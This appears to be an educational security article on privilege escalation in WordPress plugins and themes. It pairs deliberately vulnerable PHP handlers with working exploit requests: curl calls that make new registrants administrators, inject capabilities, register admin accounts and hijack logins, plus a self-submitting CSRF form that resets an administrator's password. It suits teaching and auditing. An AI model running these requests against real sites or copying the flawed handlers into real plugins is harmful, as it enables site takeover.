---
title: Privilege Escalation
---

## Introduction

This article covers cases of possible Privilege Escalation on WordPress. This includes several processes inside of the plugin/theme that can be used to escalate user privilege or role. Privilege escalation in this case also includes an account takeover case.

## Arbitrary Option Update

WordPress has an [`Options`](https://developer.wordpress.org/apis/options/) feature which is a simple and standardized way of storing data in the database. The feature makes it easy to create, access, update, and delete options. All the data is stored in the `wp_options` table under a given custom name.

Note that the *_site_* functions are essentially the same as their counterparts. The only differences occur for WP Multisite when the options apply network-wide and the data is stored in the `wp_sitemeta` table under the given custom name.

Two of the default options available are `users_can_register` and `default_role` option. The `users_can_register` option itself will decide if the site accepts an open user registration, by default this option is disabled. The `default_role` itself is an option to decide the default role for the new user upon registration on the site and has a default value of `subscriber` role.

To update an option, [`update_option`](https://developer.wordpress.org/reference/functions/update_option/) function is used. If a user can fully control the `$option` and the `$value` parameters, they can achieve a privilege escalation by enabling the `users_can_register` option and sets the `default_role` option to `administrator` so the registration feature is open and anyone can register with an administrator role.

Example of vulnerable code :

```php
add_action("wp_ajax_update_site_preference", "update_site_preference");

function update_site_preference(){
    if(empty($_POST['key']) || empty($_POST['value'])){
        echo 'Unable to update key.';
        die();
    }

    update_option($_POST['key'],$_POST['value']);
    echo "site preference updated";
    die();
}
```

To exploit this, any authenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_option` function.

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_site_preference -d "key=users_can_register&value=1"
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_site_preference -d "key=default_role&value=administrator"
``` 

After that, the user could just simply go to <WORDPRESS_BASE_URL>/wp-login.php?action=register and register an account with an administrator role.

## Arbitrary User Meta Update

According to [official documentation](https://developer.wordpress.org/plugins/users/working-with-user-metadata/), WordPress `users` table was designed to contain only the essential information about the user. Because of this, to store additional data, the `usermeta` table was introduced, which can store any arbitrary amount of data about a user.

WordPress stores each of the user role data inside of the `usermeta` table with key `wp_capabilities`. The value inside of this meta is an array value which is stored as a serialized object. Example of value inside of this meta key:

```
a:1:{s:10:"subscriber";b:1;}
```

To update users meta, [`update_user_meta`](https://developer.wordpress.org/reference/functions/update_user_meta/) function is used. If a user can fully control the `$meta_key` and the `$meta_value` parameters, they can achieve a privilege escalation by either updating their own account if the `$user_id` parameter can't be controlled or any account if the user can control the `$user_id` parameter.

Example of vulnerable code :

```php
add_action("wp_ajax_change_user_bio", "change_user_bio");

function change_user_bio(){
    $user_id = get_current_user_id();
    $bio_key = $_POST["key"];
    $bio_value = $_POST["value"];

    update_user_meta($user_id, $bio_key, $bio_value);
    echo "bio updated";
}
```

To exploit this, any authenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_user_meta` function.

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=change_user_bio -d "key=wp_capabilities&value[administrator]=1" -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
``` 

## Unrestricted User Registration

Many plugins or themes implement a custom user registration process. This case is mostly found in a page builder plugin as one of the shortcode or block features. 

One of the ways to register a user is through a [`wp_insert_user`](https://developer.wordpress.org/reference/functions/wp_insert_user/) function. This function accepts `$userdata` parameter which is an array, object, or `WP_User` object of user data arguments. One of the values inside of the parameter is `role` which determines the role for the inserted user. Another value would be `meta_input` which can be filled with custom user meta data which can also result in a privilege escalation.

Example of vulnerable code :

```php
add_action("wp_ajax_nopriv_open_registration", "open_registration");

function open_registration(){
    $user_data = array(
        'user_login'    => !empty( $_POST['reg_name'] ) ? $_POST['reg_name']: "",
        'user_pass'     => !empty( $_POST['reg_password'] ) ? $_POST['reg_password']: "",
        'user_email'    => !empty( $_POST['reg_email'] ) ? $_POST['reg_email']: "",
        'user_url'      => !empty( $_POST['reg_website'] ) ? $_POST['reg_website']: "",
        'first_name'    => !empty( $_POST['reg_fname'] ) ? $_POST['reg_fname']: "",
        'last_name'     => !empty( $_POST['reg_lname'] ) ? $_POST['reg_lname']: "",
        'nickname'      => !empty( $_POST['reg_nickname'] ) ? $_POST['reg_nickname']: "",
        'description' => !empty( $_POST['reg_bio'] ) ? $_POST['reg_bio']  : "",
        'role'        => !empty( $_POST['reg_role'] ) ? $_POST['reg_role']: get_option( 'default_role' ),
    );    

    $register_user = wp_insert_user( $user_data );
    echo "user registration complete";
}
```

To exploit this, any unauthenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `wp_insert_user` function.

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=open_registration -d "reg_name=pwned&reg_password=pwned123&reg_email=pwned@mail.com&reg_fname=pwned&reg_lname=pwned&reg_role=administrator"
``` 

## Unrestricted User Update

Similar as the above case, instead of the user registration process, this case involves updating data on the user's main table. This process is mostly found in a plugin or theme that has a custom feature to update the user's main data such as first name, last name, description, etc.

One of the ways update a user's main data is through a [`wp_update_user`](https://developer.wordpress.org/reference/functions/wp_update_user/) function. This function accepts `$userdata` parameter which is an array, object, or `WP_User` object of user data arguments. One of the values inside of the parameter is `role` which determines the role for the inserted user. Another value would be `meta_input` which can be filled with custom user meta data which can also result in a privilege escalation.

Example of vulnerable code to escalate own account role:

```php
add_action("wp_ajax_custom_update_profile", "custom_update_profile");

function custom_update_profile(){
    $user_data = array();

    foreach($_POST["data"] as $key => $value){
        $user_data[$key] = $value
    }
    
    $user_data["ID"] = get_current_user_id();

    wp_update_user( $user_data );
    echo "user profile updated";
}
```

To exploit this, any authenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `wp_update_user` function and change their own role.

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=custom_update_profile -d "data[first_name]=test&data[role]=administrator" -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
```

It is also possible to update a user's password by specifying the `user_pass` value in the `$userdata` parameter array. This could also lead to account takeover if we can control the `ID` value on the `$userdata` parameter to specify the targeted user.

Other than that, an attacker can also modify `user_activation_key`, `user_email`, or `user_login` to possibly take over their account.

## Insecure Password Reset

Similar to the custom registration process, many plugins or themes also implement a custom reset password process. This case is mostly found in a page builder plugin as one of the shortcode or block features. 

One of the ways to reset a user's password is through a [`reset_password`](https://developer.wordpress.org/reference/functions/reset_password/) function. This function accepts `$user` parameter as the targeted user object and `$new_pass` parameter as the new password value for the user.

The function itself is just a wrapper to another function [`wp_set_password`](https://developer.wordpress.org/reference/functions/wp_set_password/) which is the core function to set the new password for the user. This function accepts `$user_id` parameter as the targeted user ID and `$password` parameter as the new password value for the user.

Example of vulnerable code :

```php
add_action("wp_ajax_reset_your_password", "reset_your_password");

function reset_your_password(){
    $user_id = get_current_user_id();
    wp_set_password($_POST["new_password"], $user_id);
    echo "reset password success";
}
```

To exploit this, unauthenticated users just need to craft and serve a malicious HTML file and trick privileged users into visiting the HTML file to do a reset password action with an attacker-controlled password value.

```html
<html>
  <body>
    <form action="<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=reset_your_password" method="POST">
      <input type="hidden" name="new_password" value="attacker_controlled_value" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
``` 

## Insecure Authentication Cookie Set

In some cases, the developer needs to log in a user with a custom identifier or process. This process is mostly seen in a custom login with a third-party process, where users only need to specify some kind of unique identifier or token to be able to log in to a WordPress site.

This process of setting up the unique identifier or token to the login process many times is implemented improperly, resulting in attacker being able to log in to any user's account by supplying a guessable or known identifier or even setting up the identifier themself.

One of the functions that could be used to log in a user is [`wp_set_auth_cookie`](https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/) function. This function sets the authentication cookies based on the user ID. We only need to set the targeter user id through `$user_id` parameter and WordPress will return the authentication cookie, basically allowing the user to log in to the targeted user's account.

Example of vulnerable code :

```php
add_action("wp_ajax_nopriv_configure_platform_callback", "configure_platform_callback");
add_action("wp_ajax_nopriv_login_third_party", "login_third_party");

function configure_platform_callback(){
    $user_id = filter_input( INPUT_POST, 'user_id', FILTER_SANITIZE_STRING );
    $fbid  = filter_input( INPUT_POST, 'fbid', FILTER_SANITIZE_STRING );

    update_user_meta($user_id, "fbid", $fbid);
}

function login_third_party(){
    if ( ! isset( $_GET['fb-login'] ) ) {
        return;
    }

    $value = filter_input( INPUT_GET, 'fbid', FILTER_SANITIZE_STRING );
    $user  = get_users(
        [
            'meta_key'    => 'fbid',
            'meta_value'  => $value,
            'number'      => 1,
            'count_total' => false,
        ]
    );

    $id    = $user[0]->ID;

    wp_clear_auth_cookie();
    wp_set_current_user( $id );
    wp_set_auth_cookie( $id );
}
```

To exploit this, any unauthenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `configure_platform_callback` function and then the `login_third_party` function.

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=configure_platform_callback -d "user_id=1&fbid=1337"
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=login_third_party?fb-login=1&fbid=1337
``` 